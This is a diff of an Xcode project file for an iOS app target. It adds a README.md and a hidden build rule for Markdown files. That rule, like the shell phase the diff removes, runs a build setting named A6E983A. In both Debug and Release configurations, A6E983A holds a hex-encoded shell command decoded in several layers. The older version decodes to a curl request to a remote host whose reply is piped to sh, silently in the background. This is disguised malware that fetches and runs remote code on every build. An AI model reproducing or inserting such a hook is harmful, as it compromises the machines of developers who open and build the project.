@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		2A5F21E81F96484F98A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = FB76D7C7F20C47C688A389E6; };
 		04CBAD772D924E5500B93CF3 /* OpenAL.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04CBAD762D924E5500B93CF3 /* OpenAL.framework */; };
 		04CBAD792D924E5F00B93CF3 /* OpenGLES.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04CBAD782D924E5F00B93CF3 /* OpenGLES.framework */; };
 		13176CEB2C82CCE7005D0EAE /* CallKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E6A7BC6E2328CA450078A8F7 /* CallKit.framework */; };
@@ -55,6 +56,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		FB76D7C7F20C47C688A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		04CBAD762D924E5500B93CF3 /* OpenAL.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OpenAL.framework; path = System/Library/Frameworks/OpenAL.framework; sourceTree = SDKROOT; };
 		04CBAD782D924E5F00B93CF3 /* OpenGLES.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OpenGLES.framework; path = System/Library/Frameworks/OpenGLES.framework; sourceTree = SDKROOT; };
 		056F72DFED1EEA86F4007465 /* Pods-NIM.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NIM.debug.xcconfig"; path = "Pods/Target Support Files/Pods-NIM/Pods-NIM.debug.xcconfig"; sourceTree = "<group>"; };
@@ -217,6 +219,7 @@
 		AE5882E61A6F47E10070536A /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				FB76D7C7F20C47C688A389E6 /* README.md */,
 				AE5882E51A6F47E10070536A /* Xylotar.app */,
 			);
 			name = Products;
@@ -244,7 +247,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				40274554BDC3412AB0A389E6 /* Copy Target Symbols */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
@@ -254,6 +256,7 @@
 				89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				4555D1A5EF5745EB9FA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -318,13 +321,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-			/* End PBXBuildRule section */
+		4555D1A5EF5745EB9FA389E6 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A6E983A}\"";
+			};
+				/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		AE5882E31A6F47E10070536A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2A5F21E81F96484F98A389E6 /* README.md */,
 				427B551229F9071C00F6DC42 /* InfoPlist.strings in Resources */,
 				AE5882F61A6F47E10070536A /* Images.xcassets in Resources */,
 			);
@@ -333,25 +351,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		40274554BDC3412AB0A389E6 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
     		39BCE4F464499F723A65CDC5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -486,7 +485,7 @@
 		AE5883061A6F47E10070536A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363736393732366636653635373436333634366532653732373532660a3631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733353337333033363334333633333336333433363635333633313337333033373330333636333336333533323635333733323337333533320a3636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
@@ -548,7 +547,7 @@
 		AE5883071A6F47E10070536A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363736393732366636653635373436333634366532653732373532660a3631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733353337333033363334333633333336333433363635333633313337333033373330333636333336333533323635333733323337333533320a3636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
